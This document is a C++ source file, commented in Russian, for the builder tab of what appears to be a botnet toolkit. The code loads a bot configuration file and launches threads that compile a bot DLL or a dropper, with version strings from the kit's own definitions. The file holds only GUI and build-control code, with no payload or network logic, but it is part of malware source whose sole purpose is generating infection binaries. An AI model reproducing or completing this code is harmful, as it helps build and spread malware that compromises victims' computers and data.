#include <windows.h>
#include <shlwapi.h>
#include <shellapi.h>

#include "defines.h"
#include "dllfile32.h"
#include "dllfile64.h"
#include "resources\resources.h"
#include "builddll.h"
#include "builddropper.h"
#include "main.h"
#include "languages.h"
#include "tools.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\fs.h"
#include "..\common\gui.h"
#include "..\common\config.h"

#define WM_ENABLE_BUTTONS (WM_USER + 100)

/*
  Загрузка конфигурации.

  IN hwnd        - хэндл вкладки.
  IN OUT file    - файл конфигурации.
  OUT config     - конфигурация.
  IN showError   - выводить ли сообщение в случаи ошибки.

  Return       - true - в случаи успеха,
                 false - в случаи провала.
*/
static bool loadConfig(HWND hwnd, LPWSTR file, Config0::CFGDATA *config, bool showError)
{
	bool enable = false;
	if(Config0::_ParseFile(file, config))
	{
		if(config->dwVarsCount > 0)
			enable = true;
		else 
			Config0::_Close(config);
	}

	if(enable == false)
	{
		if(showError)
			CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_builder_source_fopen_failed), NULL, MB_ICONERROR | MB_OK);
		CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE, Languages::get(Languages::tool_builder_source_not_defined));
		file[0] = 0;
	}
	else
	{
		CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_SOURCE_EDIT), enable);
		CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_BUILD_BOT), enable);
		
		CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE, file);
	}

	return enable;
}

/*
  Включает, отключает все копки на вкладке.

  IN hwnd   - вкладка.
  IN enable - true - включить,
              false - выключить.
*/
static void enableButtons(HWND hwnd, bool enable)
{
	CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_SOURCE_BROWSE), enable);
	CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_SOURCE_EDIT), enable);
	CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_BUILD_BOT), enable);
}

enum
{
	BUILDER_DLL,
	BUILDER_DROPPER,
};

typedef struct
{
	BYTE switcher;			 //Определяет что собирать: 0 - дроппер/1 - длл.
	HWND owner;              //Окно вкладки.
	Config0::CFGDATA config; //Конфигурация.
}BUILDDATA;

/*
  Поток для процесса сборки файлов бота.

  IN p - BUILDDATA.
  
  Return  - 0
*/
static DWORD WINAPI buildThread(void *p)
{
	BUILDDATA *bd = (BUILDDATA *)p;

	switch(bd->switcher)
	{
	case BUILDER_DLL: BuildDll::_run(bd->owner, CWA(user32, GetDlgItem)(bd->owner, IDC_BUILDER_BUILD_OUTPUT), &bd->config, homePath); break;
	case BUILDER_DROPPER: BuildDropper::_run(bd->owner, CWA(user32, GetDlgItem)(bd->owner, IDC_BUILDER_BUILD_OUTPUT), &bd->config, homePath); break;
	}
	//Выход.
	Config0::_Close(&bd->config);
	CWA(user32, SendMessageW)(bd->owner, WM_ENABLE_BUTTONS, 0, 0);
	Mem::free(bd);
	return 0;
}

/*
  Обработка вкладки.
*/
INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static WCHAR configFile[MAX_PATH];
	static HANDLE subThread;

	switch(uMsg)
	{
		case WM_INITDIALOG:
			{
				subThread = NULL;

				//Выставляем строки.
				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE_BROWSE, Languages::get(Languages::tool_builder_source_browse));
				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE_EDIT, Languages::get(Languages::tool_builder_source_edit));
				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_TITLE, Languages::get(Languages::tool_builder_build_title));
				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_BOT, Languages::get(Languages::tool_builder_build_bot));
				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_DROPPER, Languages::get(Languages::tool_builder_build_dropper));
				CWA(user32, SendDlgItemMessageW)(hwnd, IDC_BUILDER_SOURCE, EM_LIMITTEXT, MAX_PATH, 0);
				CWA(user32, SendDlgItemMessageW)(hwnd, IDC_BUILDER_BUILD_OUTPUT, EM_LIMITTEXT, 0, 0);

				// Set version
				{
					WCHAR buf[1024];
					Str::_sprintfW(buf, sizeof(buf) / sizeof(WCHAR), Languages::get(Languages::tool_info_version),
						VERSION_MAJOR(BOT_VERSION), VERSION_MINOR(BOT_VERSION), VERSION_SUBMINOR(BOT_VERSION), VERSION_BUILD(BOT_VERSION), BOT_BUILDTIME);
					CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_VERSION, buf);
				}
				
				//Выбираем конфиг по умолчанию.
				{
					Config0::CFGDATA config;
					if(Fs::_pathCombine(configFile, homePath, L"config.txt") && loadConfig(hwnd, configFile, &config, false))
						Config0::_Close(&config);
				}
				break;
			}

		case WM_CANCLOSE:
			{
				closeThreadIfFinsinhed(&subThread);
				CWA(user32, SetWindowLongW)(hwnd, DWL_MSGRESULT, subThread == NULL ? true : false);
				break;
			}

		case WM_ENABLE_BUTTONS:
			{
				if(configFile[0] != 0)
					enableButtons(hwnd, true);
				break;
			}

		case WM_COMMAND: 
			{
				switch(LOWORD(wParam))
				{
					case IDC_BUILDER_SOURCE_BROWSE:
						{
							if(Gui::_browseForFile(hwnd, homePath, configFile))
							{
								Config0::CFGDATA config;
								if(loadConfig(hwnd, configFile, &config, true))
									Config0::_Close(&config);
							}
							break;
						}

					case IDC_BUILDER_SOURCE_EDIT:
						{
							if(configFile[0] != 0)
							{
								if((int)CWA(shell32, ShellExecuteW)(hwnd, L"edit", configFile, NULL, homePath, SW_SHOWNORMAL) <= 32)
								{
									CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_builder_source_edit_failed), NULL, MB_ICONERROR | MB_OK);
								}
							}
							break;
						}

					case IDC_BUILDER_BUILD_BOT:
						{
							closeThreadIfFinsinhed(&subThread);
							if(configFile[0] != 0 && subThread == NULL)
							{
								CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_OUTPUT, NULL);

								Config0::CFGDATA config;
								if(loadConfig(hwnd, configFile, &config, true))
								{
									BUILDDATA *bd = (BUILDDATA *)Mem::alloc(sizeof(BUILDDATA));
									if(bd != NULL)
									{
										bd->owner = hwnd;
										bd->switcher = BUILDER_DLL;
										Mem::_copy(&bd->config, &config, sizeof(Config0::CFGDATA));

										enableButtons(hwnd, false);
										if((subThread = CWA(kernel32, CreateThread)(NULL, 0, buildThread, bd, 0, NULL)) != NULL)
											break;
										enableButtons(hwnd, true);
										Mem::free(bd);
									}
									Config0::_Close(&config);
									CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::error_not_enough_memory), NULL, MB_ICONERROR | MB_OK);
								}
							}
							break;
						}
					case IDC_BUILDER_BUILD_DROPPER:
						{
							closeThreadIfFinsinhed(&subThread);
							if(configFile[0] != 0 && subThread == NULL)
							{
								CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_OUTPUT, NULL);

								Config0::CFGDATA config;
								if(loadConfig(hwnd, configFile, &config, true))
								{
									BUILDDATA *bd = (BUILDDATA *)Mem::alloc(sizeof(BUILDDATA));
									if(bd != NULL)
									{
										bd->owner = hwnd;
										bd->switcher = BUILDER_DROPPER;
										Mem::_copy(&bd->config, &config, sizeof(Config0::CFGDATA));

										enableButtons(hwnd, false);
										if((subThread = CWA(kernel32, CreateThread)(NULL, 0, buildThread, bd, 0, NULL)) != NULL)
											break;
										enableButtons(hwnd, true);
										Mem::free(bd);
									}
									Config0::_Close(&config);
									CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::error_not_enough_memory), NULL, MB_ICONERROR | MB_OK);
								}
							}
							break;
						}
					default:
						return FALSE;
				}
				break;
			}

		default:
			return FALSE;
	}

	return TRUE;
}
